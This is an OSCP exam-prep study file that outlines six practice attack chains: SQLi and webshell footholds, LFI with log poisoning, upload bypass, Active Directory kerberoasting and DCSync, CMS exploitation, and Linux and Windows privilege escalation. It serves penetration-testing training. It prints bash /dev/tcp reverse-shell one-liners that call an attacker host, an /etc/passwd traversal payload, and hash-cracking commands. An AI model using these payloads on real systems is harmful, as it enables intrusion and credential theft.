---
last-updated: 2026-05-03
---

# OSCP - Exam Scenarios

> OSCP is a hands-on practical exam, not a multiple-choice test. There are no exam-style scenarios in the traditional sense. Instead, this file documents **archetype attack chains** that mirror what the exam tests. Treat each as a pattern to internalize.

## How to use this

OSCP doesn't test recall. It tests whether you can recognize and execute attack chains under time pressure. Practice each archetype on TJ_NULL HTB boxes until you can complete it in 2-3 hours without notes.

---

## Archetype 1 - Web foothold via SQLi → Linux privesc via sudo misconfig

**Recon:** nmap full TCP scan; service version detection; web enumeration with `feroxbuster` / `gobuster`. Finds web app on port 80.

**Web exploitation:** SQLi in login form; manual extraction of admin credentials via UNION-based or boolean-blind SQLi. Login as admin; find file upload feature with weak validation; upload PHP webshell.

**Foothold:** webshell → reverse shell to listener via `bash -i >& /dev/tcp/<attacker>/<port> 0>&1` or `nc -e`.

**Linux privesc:** `linpeas.sh` enumeration; finds `sudo -l` shows the user can run a specific binary as root without password. Use [GTFOBins](https://gtfobins.github.io/) for that binary's privesc technique.

**Result:** root.txt captured.

**Key skills tested:** manual SQLi (no sqlmap), reverse-shell payload construction, sudo abuse via GTFOBins.

---

## Archetype 2 - Public exploit modification → Windows privesc via SeImpersonatePrivilege

**Recon:** nmap; finds Windows service on a non-standard port; identifies as a known vulnerable application.

**Web/service exploitation:** `searchsploit` finds a public PoC for the version. PoC is for a slightly different version; modify the offsets / shellcode / endpoint URL. Get RCE as a low-privileged service user.

**Foothold:** reverse shell via `msfvenom` payload (only on this one box; OSCP exam allows MSF on exactly one machine).

**Windows privesc:** `whoami /priv` shows `SeImpersonatePrivilege` enabled. Run [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) or GodPotato to elevate to SYSTEM.

**Result:** SYSTEM shell, proof.txt captured.

**Key skills tested:** modifying public exploits, msfvenom payload generation, Potato-family privesc.

---

## Archetype 3 - Active Directory chain (the 40-point set)

**Recon:** nmap on initial network range; finds DC + member server + workstation. Use `crackmapexec` to enumerate with anonymous / guest credentials.

**Initial foothold:** kerbrute or AS-REP roast via `impacket-GetNPUsers` against accounts with `DONT_REQ_PREAUTH`. Crack the AS-REP hash with `hashcat -m 18200`.

**Domain enumeration:** authenticated recon with BloodHound / SharpHound. Identify ACL-abuse paths or kerberoast opportunities.

**Lateral movement:** kerberoast service account via `impacket-GetUserSPNs`; crack with `hashcat -m 13100`. Use credentials with `crackmapexec` to find systems where they have local admin.

**Pivoting:** `chisel` or `ligolo-ng` to tunnel from foothold box to internal subnet; `proxychains` to use AD-domain tools.

**Domain compromise:** ACL abuse path (e.g., GenericAll on DA group), or DCSync via `impacket-secretsdump` if you've reached a high-value account. Pass-the-Hash to authenticate as DA on the DC.

**Result:** all 3 hosts compromised, full 40 points.

**Key skills tested:** the entire AD attack lifecycle - the largest single point block on the OSCP exam.

---

## Archetype 4 - LFI → file inclusion → log poisoning → RCE → kernel exploit

**Recon:** web app on port 80 with `?file=` parameter. Test `?file=../../../../etc/passwd` - LFI confirmed.

**LFI to RCE:** log poisoning by sending HTTP request with PHP code in User-Agent header; LFI to `/var/log/apache2/access.log` executes the PHP. Reverse shell.

**Foothold:** www-data shell.

**Linux privesc:** `linpeas.sh` finds outdated kernel; check `searchsploit linux kernel <version>` for a public LPE. Compile / transfer / execute.

**Result:** root.

**Key skills tested:** LFI exploitation chains, log poisoning, kernel exploit selection (use sparingly - kernel exploits can crash the box; have a plan B).

---

## Archetype 5 - File upload bypass → command injection → SUID privesc

**Recon:** web app with profile picture upload; client-side validation only.

**Upload bypass:** intercept with Burp; change Content-Type to `image/png` and file extension chain (e.g., `shell.php.png` or `shell.phar`). Upload succeeds.

**Webshell:** access uploaded file as PHP; execute commands.

**Reverse shell:** `bash -c 'bash -i >& /dev/tcp/<attacker>/<port> 0>&1'`.

**Privesc:** `find / -perm -4000 2>/dev/null` finds custom SUID binary. Run, observe behavior; finds it calls `system("ls")` without absolute path. PATH hijack: create `ls` script in user-controlled PATH directory; SUID re-runs as root.

**Result:** root via PATH hijack.

**Key skills tested:** upload validation bypass, manual privesc via SUID + PATH hijack (a less-common but tested pattern).

---

## Archetype 6 - WebDAV / CMS exploitation

**Recon:** Joomla / WordPress / Drupal CMS detected via `whatweb` or response headers.

**Exploitation:**
- WordPress: brute-force credentials with `wpscan`; admin login; upload malicious plugin / theme; RCE.
- Joomla: similar with Joomscan; admin template editor for RCE.
- Drupal: Drupalgeddon-class CVEs (older versions).

**Foothold:** webshell → reverse shell.

**Privesc:** standard Linux/Windows enumeration.

**Result:** root / SYSTEM.

**Key skills tested:** CMS enumeration + version-specific exploits + post-exploitation.

---

## Common reasons people fail (not archetypes, but worth memorizing)

- Tunnel vision on one foothold while the AD chain sits untouched - rotate every 30 min on dead ends.
- Skipping or rushing enumeration. Most OSCP boxes have everything you need visible in the initial nmap + enum, but you have to actually look.
- Burning the Metasploit token on an easy box, then needing it later for a hard one. Save it.
- Bad notes - getting lost in 6 machines × multiple footholds without a structured notebook is a known fail mode.
- Bad reporting - 70 lab points but proof.txt screenshots missing means a fail.
- Sleep deprivation - plan a 4-6 hour break in the middle of the 24-hour practical.

See [strategy.md](./strategy.md) for exam-day mechanics.
